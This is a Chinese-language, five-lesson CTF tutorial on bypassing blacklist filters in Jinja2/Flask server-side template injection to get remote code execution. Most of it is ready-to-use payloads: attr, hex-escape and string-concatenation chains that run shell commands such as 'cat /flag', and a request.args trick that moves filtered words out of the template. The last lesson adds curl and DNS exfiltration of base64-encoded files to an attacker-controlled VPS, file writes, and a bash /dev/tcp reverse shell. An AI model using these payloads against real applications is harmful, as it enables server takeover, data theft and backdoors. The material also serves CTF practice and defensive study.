## [g7] SSTI 黑名单绕过——傻瓜式教学：0 基础也能看懂，照做就能拼出绕过链
### [ssti-bl-basics] 第 1 课：背景与体检——模板、SSTI、黑名单是什么 | easy | SSTI;黑名单;基础 | ssti background;blacklist detect;模板注入原理
> 用大白话讲清模板引擎/SSTI/黑名单三个概念，并教你给黑名单"体检"，拿到一张"被过滤清单"
#### 这个条目的作用
本课是全套教程的第 0 课，目标是让完全没基础的人也能看懂后面四课：先用大白话讲清三个概念（模板引擎是什么、SSTI 是什么、黑名单是什么），然后教你在动手打之前先给黑名单做一次"体检"，拿到一张「被过滤清单」。这张清单是全套绕过的地图——后面选什么招，全凭它。

#### 前置条件
- 已找到一个疑似模板注入的输入点（搜索框、昵称、报错字段、导出参数等），并且 `{{7*7}}` 已经输出过 `49`（还没确认的，先看 [ssti-detect] 那课）
- 会用 Burp 或浏览器 F12 改参数、看**原始响应**（浏览器渲染会骗人，转义后的内容要回原始报文看）
- 心法：黑名单题的正确顺序永远是「探测 → 体检 → 拼链」，别上来就背 payload 硬试，那是在撞运气

#### 第 1 步：三个概念用大白话讲清
- **模板引擎** = 服务器的"奖状打印机"。程序员写好一张带空格的模板，比如 `恭喜 {{name}} 获得一等奖`，服务器渲染时把 `name` 换成真实值。这里的 `{{ }}` 是"把里面的表达式算出结果"的记号
- **SSTI** = 网站把**你输入的文本**也当成了模板代码来渲染。你输入 `{{7*7}}`，服务器不是当普通文字显示，而是**真的去算**，页面输出 49。输入能当代码执行 → 就能让服务器跑任意命令 → 拿到 RCE
- **黑名单** = 出题人为了防止你直接打穿，在渲染前检查你的输入：见到危险字符（如 `_`、`.`）或危险词（如 `class`、`os`）就**删掉、替换成空、或直接拒绝**（500/403）
- **最重要的思想**（请默念三遍）：**黑名单拦的是"写法"，不是"能力"**。`__class__` 被删了，不代表拿不到 class，只是"这种写法"被禁了。同一个操作在 Python/Jinja2 里有大量等价写法，黑名单只能封住其中几种。后面几课就是学这份「等价写法大全」

> [!info] 类比：黑名单像安检只查"行李箱"（模板源码里出现的字符串），我们换的等价写法就像把违禁品拆成零件分批带（拼接、编码、参数转移），到目的地再组装。

#### 第 2 步：给黑名单体检——建一张「被过滤清单」
不要猜，直接测。把下面每个"体检项"单独放进注入点发一次，观察现象，在笔记里记下「正常 / 被删 / 被拒」：

| 体检项 | 测试 payload | 看什么 |
|---|---|---|
| 下划线 `_` | `{{'_'}}` | 输出 `_` 说明正常；输出空或 `{{''}}` 说明 `_` 被删 |
| 点号 `.` | `{{().__class__}}` | 输出 `<class 'tuple'>` 正常；500 或空说明点被滤 |
| 方括号 `[` `]` | `{{()[0]}}` | 报错或输出变化即可能被滤（对照 `{{()}}` 的输出） |
| 引号 `'` 和 `"` | `{{'a'}}` | 输出 `a` 说明引号正常 |
| 加号 `+` | `{{7+7}}` | 输出 `14` 说明正常 |
| 花括号 `{{` | `{{7*7}}` | 输出 `49` 正常；原样输出则渲染被断 |
| 词 `class` | `{{().__class__}}` | 输出类名正常；空或 500 说明滤词 |
| 词 `globals` | `{{lipsum.__globals__}}` | 输出一大串字典正常 |
| 词 `os` | `{{lipsum.__globals__['os']}}` | 输出 `<module 'os'>` 正常 |
| 词 `popen` | `{{lipsum.__globals__['os'].popen('echo x').read()}}` | 输出 `x` 正常 |
| 词 `import` | `{{lipsum.__globals__['__builtins__']}}` | 输出 builtins 对象正常 |
| 对象 `lipsum` `cycler` `config` `request` | `{{lipsum}}` `{{cycler}}` `{{config}}` `{{request}}` | 每个单独发，输出对象名说明存在 |

三个要点：
- 现象分三种，**分开记**：**被删**（payload 里那个字符消失，如 `{{'_'}}` 变成 `{{''}}`）、**被拒**（500/403/直接拦）、**正常**
- 有的黑名单是"替换成空且只替换一次"，有的会递归替换。测试时可以发 `{{'_'_'}}` 观察是不是被删两次，这决定后面能不能用"双写"（如 `_class__` 写 `_clasclassss__` 之类）
- 关键词测试要挑"不含其他被测项"的写法，避免多个被滤项混在一起分不清是谁干的。比如测 `os` 之前，先确认 `_`、`[`、`'` 都是正常的

#### 第 3 步：根据体检结果选课
- 只滤了字符（`_`/`.`/`[` `]` 等）→ 看第 2 课
- 滤了关键词（`class`/`globals`/`os`/`popen` 等）→ 看第 3 课
- 字符关键词都滤、或嫌麻烦 → 看第 3 课的 request.args 大法 + 第 4 课拼链
- 页面没有任何输出 → 顺手做无回显判断，看第 5 课

#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| 只测了 `__class__` 就下结论"全滤了" | 体检不完整 | 按表逐项测，字符和词分开记 |
| `{{'_'}}` 没输出但 `{{7*7}}` 正常 | 只滤了 `_` 或只滤了引号 | 分开看：`{{7*7}}` 测 `{{`，`{{'a'}}` 测引号，`{{'_'}}` 测下划线 |
| 测试时 500，分不清谁干的 | 一次测了多个被滤项 | 每次只测一项；payload 其他部分用已验证正常的写法 |
| 直接发完整攻击链全部失效 | 一次踩中多个黑名单 | 先逐项体检，再组合，别拿长链试错 |
| 原样输出 `{{7*7}}` | 这不是渲染点 | 回 [ssti-detect] 找真正的渲染点 |

#### 实战要点
- 体检清单是整道题最重要的产出，花 5 分钟换来后面不盲目试错
- 记录格式建议：`被滤: _ . class globals ｜ 正常: ' " + [ ]`，越细越好
- 所有体检 payload 都无害（算术、空字符串、echo），不会误伤靶机也不会误报
- 体检完先看一眼 [ssti-rce] 的短链——如果 `lipsum`/`cycler` 没被滤，后面绕过会省一半力气
- 记住核心心法：黑名单拦写法不拦能力，等价写法多的是

### [ssti-bl-char] 第 2 课：字符级绕过——下划线、点、方括号、引号、加号 | easy | SSTI;绕过;黑名单;字符过滤 | ssti char bypass;underscore bypass;attr filter
> 每个被滤字符的等价写法：hex 编码、attr 过滤器、getitem、波浪号拼接
#### 这个条目的作用
上一课体检完，如果发现黑名单滤的是**字符**（最常见：下划线 `_`、点 `.`、方括号 `[` `]`），本课给你每个字符的「等价写法」：同一个操作，换一种完全不含被滤字符的写法写出来。字符绕过了，后面拼链就顺了。

#### 前置条件
- 已完成体检（[ssti-bl-basics]），知道**具体**是哪些字符被滤
- 已确认是 Jinja2（`{{7*'7'}}` 输出 7 个 7）
- 记住一个工具：Jinja2 的 `attr` 过滤器。`对象|attr('名字')` 等价于 `对象.名字`，是点号的官方替代品（这行里的 `|` 是过滤器语法，本身极少被黑名单滤）

#### 第 1 步：总表——被滤字符对应等价写法（先背这张表）
| 被滤字符 | 等价写法（一句话） |
|---|---|
| 点号 `.` | `attr` 过滤器：`.属性` 全换成 `attr('属性')` |
| 方括号 `[` `]` | `attr('__getitem__')(N)`：`[1]` 换成 `(1)`，`['os']` 换成 `('os')` |
| 下划线 `_` | 十六进制 `\x5f`：`__class__` 写成 `'\x5f\x5fclass\x5f\x5f'` |
| 下划线 `_`（备选） | `dict(__=x)` 建字典再 `join` 取键得到字符串 `__`，用变量拼词 |
| 加号 `+` | 波浪号 `~`：`'a'+'b'` 写成 `'a'~'b'` |
| 引号 `'` `"` | 单双引号互换；或 `request.args` 从 URL 参数取字符串（第 3 课） |
| 花括号 `{{` | `{% %}` 语句块（如 `{% if 1 %}OK{% endif %}`），注意语句块只能执行、难以直接输出 |

#### 第 2 步：点号被滤——全程用 attr，一个点都不写
`attr` 过滤器 = 点号的替身。对照记忆：

```python
{{''.__class__.__mro__[1]}}                    # 无过滤的写法
{{''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)}}   # 无点号版
```

把链里的 `.属性` 全部换成 `|attr('属性')`，把 `[N]` 换成 `|attr('__getitem__')(N)`。
预期结果：两种写法输出完全一样。如果不行：`attr` 过滤器本身也被滤（极少见）→ 用 `__getattribute__` 再套一层，或直接上 request.args 大法（第 3 课）。

#### 第 3 步：下划线被滤——十六进制编码（首选）
下划线 `_` 的十六进制是 `\x5f`，Jinja2 的字符串里支持这种转义。把 payload 里所有 `__xxx__` 的下划线都换成 `\x5f`：

```python
{{()['\x5f\x5fclass\x5f\x5f']}}        # 等价 {{()['__class__']}}
{{()|attr('\x5f\x5fclass\x5f\x5f')}}   # 配合 attr 更短
```

预期结果：输出 `<class 'tuple'>`。如果不行：`\` 或数字 `5`/`f` 也被滤（少见）→ 用下一个办法。
> [!warn] hex 只藏**下划线**，藏不住单词！如果黑名单滤的是 `class` 这个词本身，`'\x5f\x5fclass\x5f\x5f'` 里还是有 `class` 字样，照样被删——单词过滤看第 3 课。

#### 第 4 步：下划线被滤（备选）——dict|join 现场造下划线
不用 `\x5f`，用模板语法现场"造"出下划线：

```python
{% set u = dict(__=x)|join %}    # dict(__=x) 生成一个键为 '__' 的字典，join 把键连起来 → u 就等于 '__'
{{()|attr(u~'class'~u)}}         # u~'class'~u 拼出 '__class__'
```

预期结果：同样输出 `<class 'tuple'>`。原理：`dict(__=x)` 的键是 `__`，`join` 遍历字典取键得到字符串 `__`，`u~'class'~u` 拼出 `__class__`——整个源码里从头到尾没有出现字面下划线。
> [!info] 这个技巧依赖 `dict` 的关键字参数写法，不同 Jinja2 版本行为一致，但保险起见可以先在本地无过滤环境验证一次 `{% set u = dict(__=x)|join %}{{u}}` 是否输出 `__`。

#### 第 5 步：方括号被滤——attr('__getitem__') 当下标
```python
{{''.__class__.__mro__[1]}}                                     # 原版
{{''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)}} # 无方括号版
{{lipsum|attr('__globals__')|attr('__getitem__')('os')}}        # 字典取键也是它
```
预期结果：与原版等价。如果不行：`__getitem__` 里的下划线也被滤 → 叠加第 3 步的 `\x5f`：写成 `|attr('\x5f\x5fgetitem\x5f\x5f')`。

#### 第 6 步：组合——"全字符过滤"的完整链长什么样
假设体检结果是：滤 `.` `[` `]`（不滤下划线），打 RCE 的链写成：

```python
{{lipsum|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('cat /flag')|attr('read')()}}
```

对照无过滤版 `lipsum.__globals__['os'].popen('cat /flag').read()`：把每个 `.` 换成 `|attr(...)`、每个 `[...]` 换成 `|attr('__getitem__')(...)`，就是上面这个结果。如果下划线也滤，把所有 `__xxx__` 再换成 `\x5f\x5fxxx\x5f\x5f` 的写法。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| `\x5f` 写进 payload 后被原样输出 | Jinja2 没解析该转义（少了引号层） | 确认写成 `'\x5f\x5fclass\x5f\x5f'` 带引号，别裸写 |
| hex 后仍被删 | 滤的是单词 `class` 不是下划线 | 单词过滤见第 3 课，用 `~` 拼接拆词 |
| `attr` 链报错 | 链上某处属性名写错 | 逐段验证：先 `{{''|attr('__class__')}}` 出类名，再往后拼 |
| `dict(__=x)` 那条没反应 | `{% %}` 语句块被滤 | 确认 `{%` 放行；被滤则退回 `\x5f` |
| 单引号被滤 | 字面字符串写不了 | 用 `request.args` 传字符串（第 3 课） |

#### 实战要点
- 四组对应关系背下来：点号 → `attr`；方括号 → `attr('__getitem__')`；下划线 → `\x5f` 或 `dict|join`；加号 → `~`
- 打法固定：先写无过滤版完整链，再逐段替换被滤字符，最后整体扫一遍源码里还有没有被滤字符（新手最常漏：拼完才发现某处还留着一个 `.`）
- `attr` 的参数可以是表达式：写成 `|attr('__cla'~'ss__')` 这种拼接，对单词过滤和字符过滤双保险

### [ssti-bl-word] 第 3 课：关键词绕过——拆词拼接、换等价对象、request.args 大法 | medium | SSTI;绕过;黑名单;关键词过滤 | ssti keyword bypass;request args;filter word
> 关键词被滤的三种思路：拆词拼接让源码不出现完整词、换等价对象绕开 globals、request.args 把危险词搬进参数
#### 这个条目的作用
黑名单更常见的是滤**关键词**：`class`、`globals`、`os`、`popen`、`import` 等。字符办法对词无效（hex 只藏下划线，`'\x5f\x5fclass\x5f\x5f'` 里还是有 `class` 字样）。本课教三招对付关键词：① **拆词拼接**（让模板源码里不出现完整词）；② **换等价对象**（绕开 `globals` 这个词）；③ **request.args 大法**（把危险词全搬到 GET 参数里，模板源码干干净净）。

#### 前置条件
- 体检确认了具体哪些词被滤（[ssti-bl-basics]）
- 会用 `~` 拼接（第 2 课）和 `attr` 过滤器
- 心法：关键词过滤是"字面匹配"，我们的目标是让**被渲染的模板源码里不出现那个完整字符串**

#### 第 1 步：拆词拼接——`'__cla'~'ss__'`
用 `~` 把词拆成两半再拼，源码里永远没有完整的 `class`：

```python
{{()|attr('__cla'~'ss__')}}              # '__cla'~'ss__' 拼出 '__class__'
{{lipsum|attr('__global'~'s__')}}        # '__globals__' 拆开拼
{{lipsum|attr('__global'~'s__')|attr('po'~'pen')('id')|attr('re'~'ad')()}}
```

预期结果：等价于不拆的写法。拆法要点：**拼出来的结果必须完整**——`'__cla'~'ss__'` = `__class__`，`'__global'~'s__'` = `__globals__`，拆分的每一段都不含被滤的完整词。写的时候可以在纸上展开验证：`'__global'` + `'s__'` → `__globals__` ✓。
如果不行：`~` 也被滤 → 用 request.args 大法（第 4 步）。

#### 第 2 步：换等价对象——`globals` 被滤时
如果 `__globals__` 整串被滤，还有一条路：Jinja2/Flask 自带一批"全局对象"（`lipsum`、`cycler`、`url_for`、`config`、`request`、`get_flashed_messages`），它们的模块全局命名空间里直接躺着 `os` 模块，可以少走甚至不走 `__globals__` 这个词：

```python
{{lipsum|attr('os')}}                      # 直接属性访问，避开 __globals__（能通就最省事）
{{url_for|attr('__global'~'s__')|attr('__getitem__')('os')}}   # 拆词绕开 globals
{{config|attr('__class__')|attr('__init__')|attr('__global'~'s__')|attr('os')}}
```

要点：`lipsum`/`cycler` 是 Jinja2 自带，`url_for`/`config`/`request`/`get_flashed_messages` 是 Flask 才有。哪个对象存在、哪个对象的 globals 里有 os，现场逐个试（`{{对象}}` 先确认存在）。
如果 `globals` 和 `os` 都不想碰，走 `__subclasses__` 长链找 `subprocess.Popen` 或 `warnings.catch_warnings`（链见 [ssti-escape]），全程只用 `__class__`/`__mro__`/`__subclasses__` 三个词——前提是这三个词没被滤。

#### 第 3 步：`os`/`popen`/`import`/`read` 被滤时
| 被滤词 | 等价写法（一句话） |
|---|---|
| `os` | 拆词 `'o'~'s'`；或根本不取 os 这个词：`__builtins__` 里 `__import__('o'+'s')` |
| `popen` | `attr('po'~'pen')`；或换 `system` 走盲注延时（第 5 课） |
| `import` | `getattr(__builtins__, '__im'+'port__')` 或 `__builtins__['__im'~'port__']` |
| `read` | `attr('re'~'ad')()` |
| `lipsum`/`cycler` | 换 `url_for`/`config`/`request`/`get_flashed_messages`/`joiner`/`namespace` |
| `request` | 换 `config`/`url_for` 等对象；属性名也能拆，如 `attr('ar'~'gs')` |

完整示例（假设滤 `globals`、`os`、`popen`、`read` 四个词）：

```python
{{lipsum|attr('__global'~'s__')|attr('__getitem__')('o'~'s')|attr('po'~'pen')('cat /flag')|attr('re'~'ad')()}}
```

逐个核对：源码里没有连续出现的 `globals`、`os`、`popen`、`read`，只有它们的拆分片段。

#### 第 4 步：request.args 大法——危险词全部搬进 GET 参数（黑名单题的大杀器）
模板里只写"安全骨架"，所有危险字符串（`__globals__`、`__getitem__`、`os`、`popen`…）都作为 **URL 参数的值**传进去，模板运行时用 `request.args.x` 读取：

```python
# 模板源码（干净到黑名单无话可说）：
{{lipsum|attr(request.args.a)|attr(request.args.b)(request.args.c)|attr(request.args.d)(request.args.e)|attr(request.args.f)()}}
```

```txt
# URL 附带参数：
?a=__globals__&b=__getitem__&c=os&d=popen&e=cat /flag&f=read
```

原理：应用层黑名单通常只过滤"被渲染的那一段输入"（模板源码），GET 参数的值是另一条输入通道，经常没被同样的规则过滤。
预期结果：输出 flag。如果不行：① WAF 连 GET 参数一起滤 → 换 POST 参数（`request.form`/`request.values`），再不行换 Cookie/Header（`request.cookies`）；② `request` 这个词本身被滤 → 用 `config`/`url_for` 等对象，属性名拆词（`attr('ar'~'gs')`）；③ 骨架里的 `.`/`|` 也被滤 → 骨架按第 2 课重写一遍。

> [!tip] request.args 大法一条干净骨架通吃所有关键词过滤，是黑名单题的性价比之王。唯一前提：`request` 对象存在（Flask）且骨架符号放行。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| 拆词后仍被删 | 黑名单会"先还原再查"（少见）或拆法不对 | 确认拆出的每段都不含被滤词；不行就换 request.args |
| request.args 读出来是 None | 参数名写错 / 用了 GET 但参数在 POST | 核对 `?a=` 与 `request.args.a`；POST 用 `request.form`/`request.values` |
| `request` 未定义 | 不是 Flask 环境 | 换 `config`/`url_for`/`get_flashed_messages`；裸 Jinja2 用 `lipsum`/`cycler` |
| `__builtins__` 取值报错 | builtins 是模块不是字典 | 用属性访问：`__builtins__.__import__('os')` 或 `getattr(__builtins__, ...)` |
| 短链全挂 | 目标没有这些全局函数 | 回退 `__subclasses__` 长链（[ssti-escape]）叠加字符绕过 |

#### 实战要点
- 关键词三招按顺序升级：**拆**（`~` 拼接）→ **换**（等价对象/等价属性）→ **搬**（request.args 大法）
- 字符串字面量里的词也会被词过滤命中：`'os'` 里就有 `os`，凡是"取值键名/函数名"全按拆词处理，别只想着拆 `__class__`
- 每换一种对象（lipsum→cycler→url_for→config）就重测一次 `{{对象}}` 确认存在，再往后拼
- request.args 的骨架要选"短链对象"：lipsum 最短，被滤再换 cycler/url_for/config

### [ssti-bl-chain] 第 4 课：完整拼链实战——从黑名单题一路拼到 RCE | hard | SSTI;绕过;黑名单;RCE;实战 | ssti chain;payload building
> 用"下划线/点/方括号/引号/关键词全滤"的典型题演示：无过滤版 → 逐段替换 → 整体扫描 → 发送
#### 这个条目的作用
前面三课是零件，本课是组装车间：拿一个"下划线、点、方括号、引号、关键词全滤"的典型黑名单题，从头到尾演示怎么拼出一条能读 flag 的完整链。全程只有一个套路：**先写无过滤版 → 逐段对照体检清单替换 → 最后整体扫描一遍 → 发送**。

#### 前置条件
- 体检清单在手（[ssti-bl-basics]）
- 已掌握字符绕过（第 2 课）和关键词绕过（第 3 课）
- 知道目标链长什么样：无过滤版 RCE 有两套——短链（[ssti-rce]，优先）和逃逸长链（[ssti-escape]，兜底）

#### 第 1 步：先写无过滤版目标链
假设场景：体检结果 = 滤 `_ . [ ] ' "` 和关键词 `globals os popen read`（典型全滤题）。
先写出**没有任何过滤时**的最短链（短链优先）：

```python
{{lipsum.__globals__['os'].popen('cat /flag').read()}}
```

如果 `lipsum` 也被滤，换成 `cycler.__init__.__globals__.os.popen('cat /flag').read()` 或 `url_for.__globals__['os']...`，逐个试哪个对象存在。

#### 第 2 步：逐段替换——一个元素一个元素过
拿体检清单，把链里的每个"被滤元素"换成等价写法，从左到右：

```python
# ① 点号 → attr，方括号 → getitem（暂不处理下划线）：
{{lipsum|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('cat /flag')|attr('read')()}}

# ② 下划线 → \x5f：
{{lipsum|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('os')|attr('popen')('cat /flag')|attr('read')()}}

# ③ 关键词拆词（globals→global~s、os→o~s、popen→po~pen、read→re~ad）：
{{lipsum|attr('\x5f\x5fglobal'~'s'~'\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('o'~'s')|attr('po'~'pen')('cat /flag')|attr('re'~'ad')()}}
```

第 ③ 步的结果逐个核对：
- `_`：源码里没有任何字面下划线（全被 `\x5f` 替代）✓
- `.` 和 `[` `]`：没有任何点号和方括号 ✓
- 词 `globals`：源码只有 `global` 和 `s` 两个片段，没有连续 `globals` ✓（纸上展开：`'\x5f\x5fglobal'~'s'~'\x5f\x5f'` = `__globals__`）
- 词 `os`：只有 `'o'~'s'` ✓；词 `popen`：只有 `'po'~'pen'` ✓；词 `read`：只有 `'re'~'ad'` ✓
- 还剩的问题：**单引号 `'` 在源码里大量存在**——如果体检表里 `'` 也被滤，这条链直接作废，跳到第 3 步用 request.args

#### 第 3 步：引号也被滤时的出路——request.args 骨架
如果 `'` 和 `"` 都被滤，字面字符串写不了，直接切换大法，危险词全部进 URL 参数：

```python
{{lipsum|attr(request.args.a)|attr(request.args.b)(request.args.c)|attr(request.args.d)(request.args.e)|attr(request.args.f)()}}
```

```txt
?a=__globals__&b=__getitem__&c=os&d=popen&e=cat /flag&f=read
```

模板源码里只有字母、点号、括号和 `request.args` 骨架，没有下划线、没有引号、没有任何危险词，字符和关键词过滤同时免疫。`lipsum` 不在就换 `cycler`/`config`（config 需要加 `__class__.__init__` 前缀，见第 3 课）；`request` 被滤就换对象 + 属性拆词。

#### 第 4 步：整体扫描——交卷前的最后检查
拼完别急着发，把最终 payload 里的每个字符对照体检清单扫一遍（这一步新手必做，漏检是最常见翻车点）：
1. 逐个字符过：`_` 有吗 → `.` 有吗 → `[` `]` 有吗 → `'` `"` 有吗 → `+` 有吗 → `{{` 被滤吗
2. 逐个关键词过：`class`、`mro`、`subclasses`、`globals`、`builtins`、`import`、`os`、`popen`、`read`、`system`——用眼睛扫源码里有没有**连续出现**
3. 全部干净 → 发送。被拦 → 看拦的是哪一段，回对应课改

> [!warn] 展开检查法：把 `'__global'~'s~'` 这类拼接在纸上展开成完整结果再核对，别脑补。漏一个 `_` 或少拆一个词，整个链就白搭。

#### 第 5 步：出链后收尾
RCE 通了，按 [cmdi-readflag] 的顺序读 flag（`cat /flag` → `/flag.txt` → `find / -name '*flag*'`）；页面没回显走第 5 课盲打。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| 拼完还是被拦 | 漏扫：某个被滤字符/词还在源码里 | 第 4 步整体扫描逐项过 |
| `attr('\x5f\x5f...')` 原样输出 | 少了引号或转义写错 | 在无过滤环境先验证 `'\x5f\x5fclass\x5f\x5f'` 就是 `__class__` |
| 拆词拼出的结果不对 | 拼接分界错误 | 例：`'\x5f\x5fglobal'~'s'~'\x5f\x5f'` 才是 `__globals__`；先纸上展开 |
| 长链 500 | 链太长被按长度过滤 / 语法错 | 优先 request.args 骨架（长度短）；分段验证每段输出 |
| 有回显但输出空 | 命令没执行或 `.read()` 缺失 | 先用 `'id'` 代替 `'cat /flag'` 确认 RCE 本身成立 |

#### 实战要点
- 四步套路顺序不能乱：无过滤版 → 逐段替换 → 整体扫描 → 发送
- 短链（lipsum/cycler/url_for）永远优先于长链：短 = 容易绕 = 不容易超长被拦
- 引号被滤直接 request.args，别在字面字符串上死磕
- 提交前把最终 payload 展开在纸上过一遍被滤清单，5 分钟换少发 20 次请求
- 每替换一类（字符→词→对象）就单独验证一次，别一次性换完再排错

### [ssti-bl-blind] 第 5 课：无回显盲打——延时确认、外带取数、写文件 | medium | SSTI;绕过;盲注;外带 | ssti blind;blind rce;exfil
> 黑名单题没回显怎么办：sleep 延时确认 RCE，curl/DNS 外带取数，写文件留后门
#### 这个条目的作用
黑名单题常见组合拳：过滤 + 无回显（页面永远不输出命令结果）。本课教你无回显时的三板斧：① **sleep 延时**确认"命令真的在执行"；② **HTTP/DNS 外带**把 flag 发到你的服务器；③ **写文件/反弹 shell** 把"取数"变成"留后门"。所有 payload 都可以叠加前面几课的绕过写法。

#### 前置条件
- 已确认注入点是 Jinja2 且能渲染表达式
- 你自己可控的接收端：VPS（公网 IP，能起 HTTP 服务/监听端口）或 dnslog 平台（如 dnslog.cn）
- 心法：无回显不代表没 RCE，只是"怎么证明"和"怎么取数"要换手段

#### 第 1 步：sleep 延时确认 RCE（最可靠）
让模板执行 `sleep 5`，请求明显变慢 = 命令真的执行了：

```python
{{lipsum.__globals__['os'].popen('sleep 5').read()}}
# 叠加字符/关键词绕过（假设滤 _ . [ ]）：
{{lipsum|attr('\x5f\x5fglobals\x5f\x5f')|attr('__getitem__')('os')|attr('popen')('sleep 5')|attr('read')()}}
```

判定方法：先发一次普通请求计时做对照，再发 sleep 5 的 payload，用 Burp 的响应时间或 curl 的 `-w '%{time_total}'` 看耗时差约 5 秒。
如果不行：`sleep` 词被滤 → 换 `popen('ping -c 5 127.0.0.1')` 或 `os.system('sleep 5')`（system 无输出但同样延时）；延时完全没出现 → 注入点根本没渲染，回 [ssti-detect]。

> [!warn] 延时盲判必须"对照 + 等差"：sleep 1 / sleep 3 / sleep 5 各测一次，看耗时是否成比例变化。单次 5 秒可能是网络抖动。

#### 第 2 步：HTTP 外带——把 flag 发到你的服务器
确认 RCE 后，让靶机主动访问你的服务器，把数据塞进 URL：

```python
{{lipsum.__globals__['os'].popen('curl http://你的VPS:8080/$(whoami)')}}
{{lipsum.__globals__['os'].popen('curl http://你的VPS:8080/$(cat /flag | base64 -w0)')}}
```

VPS 上先监听：`nc -lvnp 8080` 或 `python3 -m http.server 8080`。收到 `GET /root` 或一段 base64 就成功了。
如果不行：靶机没 curl → 换 `wget`；`$()` 被滤 → 用反引号；数据特殊字符破坏 URL → 先 base64（上面第二条就是）。

> [!danger] 外带 flag 前务必先 base64：flag 的花括号 `{}`、下划线会破坏 URL/DNS 结构。外带目标必须是你自己的服务器或 dnslog，别往公网未知主机发数据。

#### 第 3 步：DNS 外带——HTTP 出网被禁时
DNS 查询常常比 HTTP 少被过滤。用 dnslog 平台申请子域 `xxxx.dnslog.cn`，把数据拼成子域发解析：

```python
{{lipsum.__globals__['os'].popen('ping -c 1 $(whoami).xxxx.dnslog.cn')}}
{{lipsum.__globals__['os'].popen('ping -c 1 $(cat /flag | base64 -w0).xxxx.dnslog.cn')}}
```

平台出现 `root.xxxx.dnslog.cn` 记录 = 成功，前缀就是数据。如果不行：内网 DNS 不向外解析 / 域名超长（DNS 单标签 ≤ 63 字节，base64 后分段发：`base64 -w0 | cut -c1-40` 分多次）。

#### 第 4 步：写文件与反弹 shell——把"取数"变成"留后门"
出网全不通时，让命令把数据写进文件再用别的漏洞读，或直接反弹 shell：

```python
{{lipsum.__globals__['os'].popen('id > /tmp/x.txt')}}        # 写文件，配合任意文件读/文件包含漏洞取内容
{{lipsum.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/你的VPS/4444 0>&1"')}}   # 反弹 shell，VPS 先 nc -lvnp 4444
```

如果不行：`/tmp` 不可写 → 换 `/dev/shm`（内存盘通常可写）、`/var/tmp`；反弹 shell 命令长、容易被黑名单拆 → 用 base64 编码命令再 `base64 -d | bash` 执行（思路同 [cmdi-bypass-char]）。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| sleep 5 没延时 | 注入点没渲染 / sleep 词被滤 | 回 [ssti-detect]；换 `ping -c 5` |
| 外带请求没到 VPS | 防火墙/端口没开，或靶机无 curl | 开端口；换 wget/python/DNS 外带 |
| flag 外带出来是乱的 | 没 base64，花括号/空格破坏了 URL | 一律 `base64 -w0` 再发 |
| DNS 平台无记录 | 内网 DNS 受限 / 子域超长 | 分段外带；fallback 写文件 |
| 反弹 shell 连不上 | 命令被黑名单拆了 / 靶机无 nc | base64 编码命令再执行；或改写 webshell |

#### 实战要点
- 无回显三板斧顺序：sleep 确认 → HTTP/DNS 外带 → 写文件/反弹 shell，一层不行升一层
- 外带数据一律 base64，接收端解码（`echo 密文 | base64 -d`）
- 盲打的 payload 同样要过字符/关键词过滤——无回显 + 黑名单时，把第 2/3 课的等价写法叠上来
- 延时判定要有对照和等差序列，别拿单次延迟当证据
- 反弹 shell 目标地址填你自己 VPS，别往公网未知主机发数据
